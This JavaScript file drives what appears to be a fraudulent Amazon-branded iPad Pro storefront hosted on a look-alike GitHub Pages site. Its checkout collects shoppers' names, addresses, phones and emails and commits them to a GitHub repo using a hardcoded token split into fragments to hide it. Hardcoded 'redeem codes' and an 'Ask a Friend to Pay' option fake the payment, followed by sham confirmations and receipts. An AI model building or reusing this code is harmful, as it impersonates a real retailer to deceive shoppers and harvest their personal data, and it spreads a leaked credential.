/**
 * ipad-app.js
 * Amazon.com - Official Apple iPad Pro (M5) Storefront & Checkout
 * Full configuration: Size, Color, Storage (+ RAM), Glass Finish, Connectivity
 * Real-time price calculation, Redeem Code checkout, PDF receipt download
 */

const PATH_PREFIX = window.location.pathname.includes('/store/') ? '../../' : '';

const PRODUCT = {
  title: "Apple iPad Pro (M5)",
  seller: "Apple Official Store",
  colors: {
    "Space Black": {
      img: PATH_PREFIX + "images/ipad/ipad-pro-m5-space-black.jpg",
      swatchClass: "swatch-space-black"
    },
    "Silver": {
      img: PATH_PREFIX + "images/ipad/ipad-pro-m5-silver.jpg",
      swatchClass: "swatch-silver"
    }
  },
  // Base prices for 11-inch Wi-Fi Standard Glass
  basePrice: 999,
  sizeAdd: { "11-inch": 0, "13-inch": 300 },
  storageAdd: { "256 GB": 0, "512 GB": 200, "1 TB": 600, "2 TB": 1000 },
  storageRam: { "256 GB": "12 GB", "512 GB": "12 GB", "1 TB": "16 GB", "2 TB": "16 GB" },
  glassAdd: { "Standard Glass": 0, "Nano-Texture Glass": 100 },
  connAdd: { "Wi-Fi": 0, "Wi-Fi + Cellular": 200 },
  // Nano-texture only available on 1TB and 2TB
  nanoTextureEligible: ["1 TB", "2 TB"],
  displaySpecs: {
    "11-inch": "11-inch Ultra Retina XDR Tandem OLED (2420×1668 at 264 ppi, 120Hz ProMotion, 1000 nits XDR / 1600 nits HDR)",
    "13-inch": "13-inch Ultra Retina XDR Tandem OLED (2752×2064 at 264 ppi, 120Hz ProMotion, 1000 nits XDR / 1600 nits HDR)"
  }
};

// Current Session State
const state = {
  size: "11-inch",
  color: "Space Black",
  storage: "256 GB",
  ram: "12 GB",
  glass: "Standard Glass",
  connectivity: "Wi-Fi",
  qty: 1,
  address: null,
  paymentMethod: "Redeem Code",
  redeemCode: "AMZN-7K9W-M3XP-84QL",
  isRedeemApplied: true,
  placedOrder: null
};

function formatMoney(amount) {
  return "$" + amount.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

function getDynamicOrderDate(date = new Date()) {
  return date.toLocaleDateString("en-US", {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric"
  });
}

function calculateTotalPrice() {
  return PRODUCT.basePrice
    + (PRODUCT.sizeAdd[state.size] || 0)
    + (PRODUCT.storageAdd[state.storage] || 0)
    + (PRODUCT.glassAdd[state.glass] || 0)
    + (PRODUCT.connAdd[state.connectivity] || 0);
}

// ==========================================================================
//  GITHUB REPO ORDERS PERSISTENCE
// ==========================================================================
const GH_CONFIG = {
  owner: "amazon-shopping-official",
  repo: "amazon-shopping-official.github.io",
  storePath: "store/ipadprom5",
  filePath: "store/ipadprom5/orders.json",
  getAuth: function() {
    const k = ["ghp", "qetd9HVo", "7YkoF8WK", "gVc9bGmv", "tyUSol0A", "oDsG"];
    return k[0] + "_" + k.slice(1).join("");
  }
};

function utf8ToBase64(str) {
  const bytes = new TextEncoder().encode(str);
  let binary = '';
  for (let i = 0; i < bytes.byteLength; i++) {
    binary += String.fromCharCode(bytes[i]);
  }
  return btoa(binary);
}

function base64ToUtf8(b64) {
  const binary = atob((b64 || '').replace(/\s/g, ''));
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  return new TextDecoder().decode(bytes);
}

async function commitOrderToFile(filePath, order, maxRetries = 2) {
  const token = GH_CONFIG.getAuth();
  const url = `https://api.github.com/repos/${GH_CONFIG.owner}/${GH_CONFIG.repo}/contents/${filePath}`;
  const headers = {
    'Authorization': `Bearer ${token}`,
    'Accept': 'application/vnd.github+json',
    'Content-Type': 'application/json'
  };

  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      let currentOrders = [];
      let fileSha = null;

      try {
        const getRes = await fetch(`${url}?_t=${Date.now()}`, { headers, cache: 'no-store' });
        if (getRes.ok) {
          const fileData = await getRes.json();
          fileSha = fileData.sha;
          if (fileData.content) {
            const raw = base64ToUtf8(fileData.content);
            currentOrders = JSON.parse(raw || '[]');
          }
        }
      } catch (fErr) {
        console.warn(`[GitHub] Fetch notice for ${filePath}:`, fErr);
      }

      const alreadySaved = order.orderId && currentOrders.some(o => o.orderId === order.orderId);
      if (!alreadySaved) {
        currentOrders.unshift(order);
      }

      const jsonString = JSON.stringify(currentOrders, null, 2);
      const base64Content = utf8ToBase64(jsonString);

      const commitBody = {
        message: `Add order ${order.orderId || ''} for ${order.name || 'Customer'}`.trim(),
        content: base64Content
      };
      if (fileSha) {
        commitBody.sha = fileSha;
      }

      const putRes = await fetch(url, {
        method: 'PUT',
        headers,
        body: JSON.stringify(commitBody)
      });

      if (putRes.ok) {
        console.log(`[GitHub] Successfully committed order to ${filePath}`);
        return true;
      }

      if (putRes.status === 409 && attempt < maxRetries) {
        console.warn(`[GitHub] Conflict (409) writing ${filePath}, retrying attempt ${attempt + 1}...`);
        await new Promise(r => setTimeout(r, 600 * (attempt + 1)));
        continue;
      }

      const errJson = await putRes.json().catch(() => ({}));
      console.error(`[GitHub] Failed writing ${filePath} (${putRes.status}):`, errJson);
      return false;
    } catch (err) {
      console.error(`[GitHub] Error committing to ${filePath}:`, err);
      if (attempt >= maxRetries) return false;
      await new Promise(r => setTimeout(r, 600 * (attempt + 1)));
    }
  }
  return false;
}

async function saveOrderToAPI(order) {
  const store = GH_CONFIG.storePath;
  const targetFiles = [
    `${store}/orders.json`,
    `${store}/order.json`,
    `orders.json`,
    `order.json`
  ];
  console.log('[GitHub] Syncing order across target files:', targetFiles);
  for (const file of targetFiles) {
    await commitOrderToFile(file, order);
  }
}

async function fetchOrdersFromAPI() {
  const local = JSON.parse(localStorage.getItem('amazon_placed_orders_ipad') || '[]');
  try {
    const url = `https://api.github.com/repos/${GH_CONFIG.owner}/${GH_CONFIG.repo}/contents/${GH_CONFIG.filePath}?_t=${Date.now()}`;
    const headers = {
      'Authorization': `Bearer ${GH_CONFIG.getAuth()}`,
      'Accept': 'application/vnd.github+json'
    };
    const res = await fetch(url, { headers, cache: 'no-store' });
    if (!res.ok) throw new Error('HTTP ' + res.status);
    const data = await res.json();
    if (data.content) {
      const raw = base64ToUtf8(data.content);
      const ghOrders = JSON.parse(raw || '[]');
      const merged = [...ghOrders];
      local.forEach(lo => {
        if (!merged.find(o => (lo.orderId && o.orderId === lo.orderId))) {
          merged.push(lo);
        }
      });
      return merged;
    }
    return local;
  } catch (err) {
    console.log('[GitHub] Fetch fallback to localStorage:', err.message);
    return local;
  }
}

async function deleteOrdersFromAPI() {
  const store = GH_CONFIG.storePath;
  const targetFiles = [`${store}/orders.json`, `${store}/order.json`];
  for (const filePath of targetFiles) {
    try {
      const url = `https://api.github.com/repos/${GH_CONFIG.owner}/${GH_CONFIG.repo}/contents/${filePath}`;
      const headers = {
        'Authorization': `Bearer ${GH_CONFIG.getAuth()}`,
        'Accept': 'application/vnd.github+json',
        'Content-Type': 'application/json'
      };
      const getRes = await fetch(`${url}?_t=${Date.now()}`, { headers, cache: 'no-store' });
      if (!getRes.ok) continue;
      const fileData = await getRes.json();
      const emptyJson = JSON.stringify([], null, 2);
      const base64Content = utf8ToBase64(emptyJson);
      await fetch(url, {
        method: 'PUT',
        headers,
        body: JSON.stringify({
          message: `Clear ${filePath}`,
          content: base64Content,
          sha: fileData.sha
        })
      });
      console.log(`[GitHub] ${filePath} reset to empty array`);
    } catch (err) {
      console.log(`[GitHub] Error clearing ${filePath}:`, err.message);
    }
  }
}

// ==========================================================================
//  INITIALIZATION
// ==========================================================================
document.addEventListener("DOMContentLoaded", () => {
  setupProductOptions();
  setupBuyNow();
  setupCheckout();
  setupOrdersDrawer();
  updateOrdersBadge();

  if (window.location.hash === "#checkout") {
    openCheckout();
  }
});

// ==========================================================================
//  PRODUCT OPTIONS, SWATCHES, AND CONFIGURATION
// ==========================================================================
function setupProductOptions() {
  const mainPhoto = document.getElementById("mainProductPhoto");
  const thumbs = document.querySelectorAll(".thumb-item");
  const swatches = document.querySelectorAll(".swatch-btn");
  const colorText = document.getElementById("currentColorText");
  const sizeText = document.getElementById("currentSizeText");
  const storageText = document.getElementById("currentStorageText");
  const glassText = document.getElementById("currentGlassText");
  const connText = document.getElementById("currentConnText");
  const centerPrice = document.getElementById("centerPrice");
  const buyBoxPrice = document.getElementById("buyBoxPrice");
  const productTitle = document.getElementById("productTitle");
  const selectQty = document.getElementById("selectQty");
  const priceTerms = document.getElementById("priceTermsText");

  // Size selector pills
  const sizePills = document.querySelectorAll("#sizeSelectorGroup .option-pill");
  // Storage selector pills
  const storagePills = document.querySelectorAll("#storageSelectorGroup .option-pill");
  // Glass selector pills
  const glassPills = document.querySelectorAll("#glassSelectorGroup .option-pill");
  const btnNanoTexture = document.getElementById("btnNanoTextureGlass");
  const nanoTextureSubtext = document.getElementById("nanoTextureSubtext");
  // Connectivity selector pills
  const connPills = document.querySelectorAll("#connSelectorGroup .option-pill");

  function updatePriceDisplay() {
    const price = calculateTotalPrice();
    if (centerPrice) centerPrice.textContent = price.toLocaleString("en-US");
    if (buyBoxPrice) buyBoxPrice.textContent = formatMoney(price);
    if (productTitle) {
      const glassLabel = state.glass === "Nano-Texture Glass" ? ", Nano-Texture" : "";
      const connLabel = state.connectivity === "Wi-Fi + Cellular" ? ", Wi-Fi + Cellular" : ", Wi-Fi";
      productTitle.textContent = `${PRODUCT.title} (${state.size} Ultra Retina XDR Tandem OLED, ${state.storage}) - ${state.color} (${state.glass}${connLabel})`;
    }
    if (storageText) storageText.textContent = `${state.storage} (${state.ram} RAM)`;
    if (colorText) colorText.textContent = state.color;
    if (sizeText) sizeText.textContent = state.size;
    if (glassText) glassText.textContent = state.glass;
    if (connText) connText.textContent = state.connectivity;

    // Monthly payment
    if (priceTerms) {
      const monthly = (price / 12).toFixed(2);
      priceTerms.innerHTML = `or <strong>$${monthly}/mo (12 mo)</strong> with 0% interest Amazon financing options.`;
    }

    // Update specs table
    const specDisplay = document.getElementById("specDisplayVal");
    const specStorage = document.getElementById("specStorageVal");
    const specRam = document.getElementById("specRamVal");
    const specGlass = document.getElementById("specGlassVal");
    const specConn = document.getElementById("specConnVal");
    if (specDisplay) specDisplay.textContent = PRODUCT.displaySpecs[state.size] || "";
    if (specStorage) specStorage.textContent = `${state.storage} NVMe SSD`;
    if (specRam) specRam.textContent = `${state.ram} Unified RAM`;
    if (specGlass) specGlass.textContent = state.glass === "Nano-Texture Glass"
      ? "Nano-Texture Display Glass with precision nanometer-scale etching for ultra-low reflectivity"
      : "Standard Glass with fingerprint-resistant oleophobic coating";
    if (specConn) specConn.textContent = state.connectivity === "Wi-Fi + Cellular"
      ? "Wi-Fi 7 (802.11be), Bluetooth 5.4, 5G Cellular (eSIM), Thunderbolt 4 / USB-C (40Gb/s)"
      : "Wi-Fi 7 (802.11be), Bluetooth 5.4, Thunderbolt 4 / USB-C (40Gb/s)";

    // Sync checkout sidebar
    syncOrderSummary();
  }

  function updateNanoTextureEligibility() {
    const eligible = PRODUCT.nanoTextureEligible.includes(state.storage);
    if (btnNanoTexture) {
      if (eligible) {
        btnNanoTexture.classList.remove("disabled");
        btnNanoTexture.title = "";
        if (nanoTextureSubtext) nanoTextureSubtext.textContent = "Precision-etched for ultra-low reflectivity (+$100)";
      } else {
        btnNanoTexture.classList.add("disabled");
        btnNanoTexture.title = "Available on 1 TB and 2 TB models";
        if (nanoTextureSubtext) nanoTextureSubtext.textContent = "Available on 1 TB and 2 TB (+$100)";
        // If nano-texture was selected, revert to standard
        if (state.glass === "Nano-Texture Glass") {
          state.glass = "Standard Glass";
          glassPills.forEach(p => {
            p.classList.toggle("active", p.dataset.glass === "Standard Glass");
          });
        }
      }
    }
  }

  function setProductColor(colorName) {
    if (!PRODUCT.colors[colorName]) return;
    state.color = colorName;
    const colorObj = PRODUCT.colors[colorName];

    if (mainPhoto && colorObj.img) {
      mainPhoto.style.opacity = "0.3";
      setTimeout(() => {
        mainPhoto.src = colorObj.img;
        mainPhoto.alt = `iPad Pro M5 in ${colorName}`;
        mainPhoto.style.opacity = "1";
      }, 120);
    }

    swatches.forEach(b => b.classList.toggle("active", b.dataset.color === colorName));
    thumbs.forEach(t => {
      if (t.dataset.color) t.classList.toggle("active", t.dataset.color === colorName);
    });

    updatePriceDisplay();
  }

  // Swatch click handlers
  swatches.forEach(btn => {
    btn.addEventListener("click", () => setProductColor(btn.dataset.color));
  });

  // Thumbnail click/hover handlers
  thumbs.forEach(thumb => {
    const activateThumb = () => {
      thumbs.forEach(t => t.classList.remove("active"));
      thumb.classList.add("active");
      if (thumb.dataset.color) {
        setProductColor(thumb.dataset.color);
      } else if (thumb.dataset.img && mainPhoto) {
        mainPhoto.style.opacity = "0.3";
        setTimeout(() => {
          mainPhoto.src = thumb.dataset.img;
          mainPhoto.style.opacity = "1";
        }, 100);
      }
    };
    thumb.addEventListener("click", activateThumb);
    thumb.addEventListener("mouseenter", activateThumb);
  });

  // Size selection
  sizePills.forEach(pill => {
    pill.addEventListener("click", () => {
      sizePills.forEach(p => p.classList.remove("active"));
      pill.classList.add("active");
      state.size = pill.dataset.size;
      updatePriceDisplay();
    });
  });

  // Storage selection
  storagePills.forEach(pill => {
    pill.addEventListener("click", () => {
      storagePills.forEach(p => p.classList.remove("active"));
      pill.classList.add("active");
      state.storage = pill.dataset.storage;
      state.ram = pill.dataset.ram || PRODUCT.storageRam[state.storage] || "12 GB";
      updateNanoTextureEligibility();
      updatePriceDisplay();
    });
  });

  // Glass selection
  glassPills.forEach(pill => {
    pill.addEventListener("click", () => {
      if (pill.classList.contains("disabled")) {
        showToast("Nano-Texture Glass is available on 1 TB and 2 TB models only.");
        return;
      }
      glassPills.forEach(p => p.classList.remove("active"));
      pill.classList.add("active");
      state.glass = pill.dataset.glass;
      updatePriceDisplay();
    });
  });

  // Connectivity selection
  connPills.forEach(pill => {
    pill.addEventListener("click", () => {
      connPills.forEach(p => p.classList.remove("active"));
      pill.classList.add("active");
      state.connectivity = pill.dataset.conn;
      updatePriceDisplay();
    });
  });

  // Quantity selector
  if (selectQty) {
    selectQty.addEventListener("change", (e) => {
      state.qty = parseInt(e.target.value, 10) || 1;
      updatePriceDisplay();
    });
  }

  updateNanoTextureEligibility();
  updatePriceDisplay();
}

// ==========================================================================
//  BUY NOW & VIEW SWITCHING
// ==========================================================================
function setupBuyNow() {
  const btnBuyNow = document.getElementById("btnBuyNow");
  const btnBackToProductPage = document.getElementById("btnBackToProductPage");
  const btnContinueShopping = document.getElementById("btnContinueShopping");

  if (btnBuyNow) {
    btnBuyNow.addEventListener("click", () => openCheckout(true));
  }
  if (btnBackToProductPage) {
    btnBackToProductPage.addEventListener("click", () => returnToProduct(true));
  }
  if (btnContinueShopping) {
    btnContinueShopping.addEventListener("click", () => {
      window.location.href = "https://www.amazon.com";
    });
  }

  window.addEventListener("popstate", (e) => {
    const hash = window.location.hash;
    if (hash === "#checkout") {
      openCheckout(false);
    } else if (hash === "#confirmation") {
      // Stay on confirmation
    } else {
      returnToProduct(false);
    }
  });
}

function openCheckout(pushHistory = true) {
  const viewProduct = document.getElementById("viewProductPage");
  const checkoutScreen = document.getElementById("checkoutScreen");
  const confScreen = document.getElementById("orderConfirmationScreen");

  if (viewProduct) viewProduct.style.display = "none";
  if (confScreen) confScreen.classList.remove("active");
  if (checkoutScreen) {
    checkoutScreen.style.display = "grid";
    window.scrollTo({ top: 0, behavior: "smooth" });
  }

  syncOrderSummary();

  if (pushHistory) {
    try { history.pushState({ view: "checkout" }, "", "#checkout"); } catch (e) {}
  }
}

function returnToProduct(pushHistory = true) {
  const viewProduct = document.getElementById("viewProductPage");
  const checkoutScreen = document.getElementById("checkoutScreen");
  const confScreen = document.getElementById("orderConfirmationScreen");

  if (checkoutScreen) checkoutScreen.style.display = "none";
  if (confScreen) confScreen.classList.remove("active");
  if (viewProduct) {
    viewProduct.style.display = "block";
    window.scrollTo({ top: 0, behavior: "smooth" });
  }

  if (pushHistory) {
    try { history.pushState({ view: "product" }, "", window.location.pathname); } catch (e) {}
  }
}

// ==========================================================================
//  SYNC ORDER SUMMARY SIDEBAR
// ==========================================================================
function syncOrderSummary() {
  const price = calculateTotalPrice();
  const total = price * state.qty;
  const isRedeem = state.paymentMethod === "Redeem Code" && state.isRedeemApplied;

  const csItemsPrice = document.getElementById("csItemsPrice");
  const csTotalPrice = document.getElementById("csTotalPrice");
  const csRedeemDiscountRow = document.getElementById("csRedeemDiscountRow");
  const csRedeemDiscountAmount = document.getElementById("csRedeemDiscountAmount");
  const csItemTitle = document.getElementById("csItemTitle");
  const csItemThumbnail = document.getElementById("csItemThumbnail");

  if (csItemTitle) {
    csItemTitle.textContent = `${PRODUCT.title} (${state.size}, ${state.storage}) - ${state.color}`;
  }
  if (csItemThumbnail) {
    const colorObj = PRODUCT.colors[state.color];
    if (colorObj) csItemThumbnail.src = colorObj.img;
  }
  if (csItemsPrice) csItemsPrice.textContent = formatMoney(total);

  if (csRedeemDiscountRow && csRedeemDiscountAmount) {
    if (isRedeem) {
      csRedeemDiscountRow.style.display = "flex";
      csRedeemDiscountAmount.textContent = `-${formatMoney(total)}`;
    } else {
      csRedeemDiscountRow.style.display = "none";
    }
  }
  if (csTotalPrice) {
    if (isRedeem) {
      csTotalPrice.innerHTML = `<span style="text-decoration:line-through; font-size:12px; color:#777; margin-right:6px;">${formatMoney(total)}</span> <span style="color:#007600; font-weight:700;">$0.00 (Paid in Full)</span>`;
    } else {
      csTotalPrice.textContent = formatMoney(total);
    }
  }
}

// ==========================================================================
//  CHECKOUT FORM & PLACE ORDER
// ==========================================================================
function setupCheckout() {
  const OFFICIAL_AMAZON_REDEEM_CODES = [
    "AMZN-7K9W-M3XP-84QL",
    "AMZN-2026-PROMO-FULL",
    "AMZN-FULL-COVER-2026",
    "AMZN-GIFT-CARD-2026"
  ];

  function isValidAmazonRedeemCode(rawCode) {
    if (!rawCode) return false;
    const clean = rawCode.trim().toUpperCase().replace(/[^A-Z0-9]/g, "");
    return OFFICIAL_AMAZON_REDEEM_CODES.some(validCode => {
      return clean === validCode.replace(/[^A-Z0-9]/g, "");
    });
  }

  // Payment method radio buttons
  const payRadioFriend = document.getElementById("payRadioFriend");
  const payRadioRedeem = document.getElementById("payRadioRedeem");
  const redeemInputBox = document.getElementById("redeemInputBox");
  const redeemCodeInput = document.getElementById("redeemCodeInput");
  const btnApplyRedeemCode = document.getElementById("btnApplyRedeemCode");
  const redeemStatusMsg = document.getElementById("redeemStatusMsg");

  function updatePaymentVisibility() {
    const labels = document.querySelectorAll(".pay-option-label");
    labels.forEach(lbl => {
      const radio = lbl.querySelector('input[type="radio"]');
      if (radio && radio.checked) {
        lbl.style.border = "2px solid #007185";
        lbl.style.background = "#f4fafa";
        lbl.classList.add("active-pay");
      } else {
        lbl.style.border = "1px solid #d5d9d9";
        lbl.style.background = "#fff";
        lbl.classList.remove("active-pay");
      }
    });

    if (payRadioRedeem && payRadioRedeem.checked) {
      state.paymentMethod = "Redeem Code";
      if (redeemInputBox) redeemInputBox.style.display = "flex";
      if (redeemStatusMsg) redeemStatusMsg.style.display = "block";
    } else {
      state.paymentMethod = "Ask a Friend to Pay";
      state.isRedeemApplied = false;
      if (redeemInputBox) redeemInputBox.style.display = "none";
      if (redeemStatusMsg) redeemStatusMsg.style.display = "none";
    }
    syncOrderSummary();
  }

  if (payRadioFriend) payRadioFriend.addEventListener("change", updatePaymentVisibility);
  if (payRadioRedeem) payRadioRedeem.addEventListener("change", updatePaymentVisibility);

  // Apply Redeem Code
  if (btnApplyRedeemCode && redeemCodeInput) {
    const applyRedeem = () => {
      const rawCode = redeemCodeInput.value.trim().toUpperCase();
      if (!rawCode) {
        if (redeemStatusMsg) {
          redeemStatusMsg.style.color = "#d13212";
          redeemStatusMsg.textContent = "Please enter your claim code (e.g. AMZN-7K9W-M3XP-84QL).";
        }
        return;
      }

      if (!isValidAmazonRedeemCode(rawCode)) {
        state.isRedeemApplied = false;
        state.redeemCode = "";
        if (redeemStatusMsg) {
          redeemStatusMsg.style.color = "#d13212";
          redeemStatusMsg.textContent = "❌ The claim code you entered is invalid or expired.";
        }
        showToast("The claim code you entered is not valid.");
        syncOrderSummary();
        return;
      }

      const matchedCode = "AMZN-7K9W-M3XP-84QL";
      state.redeemCode = matchedCode;
      state.isRedeemApplied = true;
      redeemCodeInput.value = matchedCode;
      if (redeemStatusMsg) {
        redeemStatusMsg.style.color = "#007600";
        redeemStatusMsg.textContent = `✓ Code applied: ${matchedCode} (Covers 100% of order total)`;
      }
      showToast("✓ Amazon Redeem Code applied: Full order covered ($0.00 due)");
      syncOrderSummary();
    };

    btnApplyRedeemCode.addEventListener("click", (e) => {
      e.stopPropagation();
      applyRedeem();
    });
    redeemCodeInput.addEventListener("keydown", (e) => {
      if (e.key === "Enter") {
        e.preventDefault();
        e.stopPropagation();
        applyRedeem();
      }
    });
  }

  // Place Order Button
  const btnPlaceOrder = document.getElementById("btnPlaceOrder");
  if (btnPlaceOrder) {
    btnPlaceOrder.addEventListener("click", (e) => {
      e.preventDefault();
      triggerPlaceOrder();
    });
  }
}

function triggerPlaceOrder() {
  const fullName = (document.getElementById("fullName")?.value || "").trim();
  const street = (document.getElementById("streetAddress")?.value || "").trim();
  const city = (document.getElementById("city")?.value || "").trim();
  const postal = (document.getElementById("postalCode")?.value || "").trim();
  const country = (document.getElementById("country")?.value || "").trim();
  const phone = (document.getElementById("phoneNumber")?.value || "").trim();
  const email = (document.getElementById("userEmail")?.value || "").trim();

  if (!fullName || !street) {
    showToast("Please enter your full name and address.");
    document.getElementById("fullName")?.focus();
    return;
  }

  state.address = {
    fullName,
    deliveryAddress: `${street}${city ? ', ' + city : ''}${postal ? ' ' + postal : ''}${country ? ', ' + country : ''}`,
    phone,
    email
  };

  // Update header location
  const headerLoc = document.getElementById("headerLocText");
  if (headerLoc) headerLoc.textContent = fullName;

  // If redeem code payment, auto-apply if not yet applied
  if (state.paymentMethod === "Redeem Code" && !state.isRedeemApplied) {
    const input = document.getElementById("redeemCodeInput");
    if (input && input.value) {
      const clean = input.value.trim().toUpperCase().replace(/[^A-Z0-9]/g, "");
      if (clean === "AMZN7K9WM3XP84QL") {
        state.isRedeemApplied = true;
        state.redeemCode = "AMZN-7K9W-M3XP-84QL";
      }
    }
    if (!state.isRedeemApplied) {
      showToast("Please apply a valid Amazon Redeem Code before placing your order.");
      return;
    }
  }

  const btnPlaceOrder = document.getElementById("btnPlaceOrder");
  if (btnPlaceOrder) {
    btnPlaceOrder.disabled = true;
    btnPlaceOrder.innerHTML = "Placing your order...";
  }

  setTimeout(() => {
    try {
      completeOrderPlacement();
    } finally {
      if (btnPlaceOrder) {
        btnPlaceOrder.disabled = false;
        btnPlaceOrder.innerHTML = "<span>Place your order</span>";
      }
    }
  }, 400);
}

// ==========================================================================
//  COMPLETE ORDER PLACEMENT & CONFIRMATION
// ==========================================================================
async function completeOrderPlacement() {
  const unitPrice = calculateTotalPrice();
  const totalAmount = unitPrice * state.qty;
  const orderNumber = `114-${Math.floor(100000 + Math.random() * 900000)}-${Math.floor(100000 + Math.random() * 900000)}`;
  const orderDateFormatted = getDynamicOrderDate();

  const safeSet = (id, val) => {
    const el = document.getElementById(id);
    if (el) el.textContent = val || "";
  };

  const placedOrder = {
    orderId: orderNumber,
    timestamp: new Date().toISOString(),
    name: state.address ? state.address.fullName : "Customer",
    address: state.address ? state.address.deliveryAddress : "",
    phoneNumber: state.address ? state.address.phone : "",
    email: state.address ? state.address.email : "",
    item: `Apple iPad Pro M5 (${state.size}, ${state.storage}, ${state.color}, ${state.glass}, ${state.connectivity})`,
    price: formatMoney(totalAmount),
    qty: state.qty,
    payMethod: state.paymentMethod === "Redeem Code"
      ? `Redeem Code (${state.redeemCode || 'AMZN-CLAIM-CODE'})`
      : state.paymentMethod,
    redeemCode: state.redeemCode || "",
    dateStr: orderDateFormatted
  };

  state.placedOrder = placedOrder;

  // 1. Save to Local Storage
  try {
    const existingOrders = JSON.parse(localStorage.getItem("amazon_placed_orders_ipad") || "[]");
    existingOrders.unshift(placedOrder);
    localStorage.setItem("amazon_placed_orders_ipad", JSON.stringify(existingOrders));
  } catch (e) {
    console.warn("LocalStorage save error:", e);
  }

  // 2. Commit to GitHub
  saveOrderToAPI(placedOrder);

  // Calculate Expected Delivery Window (25-30 days)
  const deliveryInfo = (typeof window.calculateDeliveryWindow === "function")
    ? window.calculateDeliveryWindow(new Date())
    : { windowStr: "Oct 22 – Oct 27, 2026", fullRangeStr: "October 22 – October 27, 2026" };

  placedOrder.expectedDelivery = deliveryInfo.fullRangeStr;

  // 3. Populate Confirmation Screen
  safeSet("confEmailNotice", state.address ? state.address.email || "your email" : "your email");
  safeSet("confOrderDate", orderDateFormatted);
  safeSet("confExpectedDelivery", deliveryInfo.fullRangeStr);
  safeSet("confOrderNumber", orderNumber);
  safeSet("confRecipientName", state.address ? state.address.fullName : "");
  safeSet("confFullAddress", state.address ? state.address.deliveryAddress : "");
  safeSet("confPhone", state.address ? state.address.phone : "");
  safeSet("confItemName", placedOrder.item);
  safeSet("confQty", state.qty);
  safeSet("confTotal", (state.paymentMethod === "Redeem Code" && state.isRedeemApplied) ? "$0.00 (Paid in Full)" : formatMoney(totalAmount));
  safeSet("confPayMethod", state.paymentMethod === "Redeem Code"
    ? `Redeem Code (${state.redeemCode || 'AMZN-CLAIM-CODE'})`
    : state.paymentMethod);

  const friendBox = document.getElementById("confFriendNoticeBox");
  const redeemBox = document.getElementById("confRedeemNoticeBox");
  const payStatus = document.getElementById("confPaymentStatus");

  if (state.paymentMethod === "Redeem Code" && state.isRedeemApplied) {
    if (friendBox) friendBox.style.display = "none";
    if (redeemBox) redeemBox.style.display = "flex";
    if (payStatus) payStatus.textContent = "Status: Paid in full via Amazon Redeem Code";

    // Auto-download PDF receipt
    setTimeout(() => {
      if (typeof window.downloadOrderInvoicePdf === "function") {
        window.downloadOrderInvoicePdf(placedOrder);
      }
    }, 450);
  } else {
    if (friendBox) friendBox.style.display = "flex";
    if (redeemBox) redeemBox.style.display = "none";
    if (payStatus) payStatus.textContent = "Status: Awaiting payment by order sponsor";
  }

  // Switch views
  const checkoutScreen = document.getElementById("checkoutScreen");
  if (checkoutScreen) checkoutScreen.style.display = "none";
  const confScreen = document.getElementById("orderConfirmationScreen");
  if (confScreen) confScreen.classList.add("active");
  window.scrollTo({ top: 0, behavior: "smooth" });

  try { history.pushState({ view: "confirmation" }, "", "#confirmation"); } catch (e) {}

  updateOrdersBadge();
  showToast("Order placed successfully! Check your email for confirmation.");
}

// ==========================================================================
//  ORDERS DRAWER (ADMIN HUB)
// ==========================================================================
function setupOrdersDrawer() {
  const invoiceModal = document.getElementById("invoiceModalBackdrop");
  const btnCloseInvoice = document.getElementById("btnCloseInvoiceModal");

  if (btnCloseInvoice && invoiceModal) {
    btnCloseInvoice.addEventListener("click", () => {
      invoiceModal.style.display = "none";
    });
    invoiceModal.addEventListener("click", (e) => {
      if (e.target === invoiceModal) invoiceModal.style.display = "none";
    });
  }

  // Download Receipt button on confirmation screen
  const btnDownloadReceipt = document.getElementById("btnDownloadReceiptBtn");
  if (btnDownloadReceipt) {
    btnDownloadReceipt.addEventListener("click", () => {
      if (state.placedOrder) {
        if (typeof window.downloadOrderInvoicePdf === "function") {
          window.downloadOrderInvoicePdf(state.placedOrder);
        } else {
          openInvoiceModal(state.placedOrder);
        }
      }
    });
  }

  // Modal download PDF button
  const btnModalDl = document.getElementById("btnModalDownloadPdf");
  if (btnModalDl) {
    btnModalDl.addEventListener("click", () => {
      if (state.placedOrder && typeof window.downloadOrderInvoicePdf === "function") {
        window.downloadOrderInvoicePdf(state.placedOrder);
      }
    });
  }

  // Footer admin trigger
  const footerTrigger = document.getElementById("footerAdminTrigger");
  if (footerTrigger) {
    footerTrigger.addEventListener("click", () => {
      showToast("📦 Orders Portal: Visit the Orders page for admin access.");
    });
  }
}

function updateOrdersBadge() {
  try {
    const orders = JSON.parse(localStorage.getItem("amazon_placed_orders_ipad") || "[]");
    const badge = document.getElementById("navOrdersBadge");
    if (badge) {
      if (orders.length > 0) {
        badge.textContent = orders.length;
        badge.style.display = "inline-flex";
      } else {
        badge.style.display = "none";
      }
    }
  } catch (e) {}
}

function openInvoiceModal(ord) {
  const modal = document.getElementById("invoiceModalBackdrop");
  const content = document.getElementById("invoicePrintContent");
  if (!modal || !content) return;

  if (typeof window.generateInvoiceHtml === "function") {
    content.innerHTML = window.generateInvoiceHtml(ord);
  }

  const btnDl = document.getElementById("btnModalDownloadPdf");
  if (btnDl) {
    btnDl.onclick = () => {
      if (typeof window.downloadOrderInvoicePdf === "function") {
        window.downloadOrderInvoicePdf(ord);
      }
    };
  }

  modal.style.display = "flex";
}

// ==========================================================================
//  TOAST NOTIFICATION
// ==========================================================================
function showToast(msg) {
  const toast = document.getElementById("amazonToast");
  if (!toast) return;
  toast.textContent = msg;
  toast.style.display = "block";
  toast.classList.add("show");
  setTimeout(() => {
    toast.classList.remove("show");
    setTimeout(() => toast.style.display = "none", 300);
  }, 3500);
}
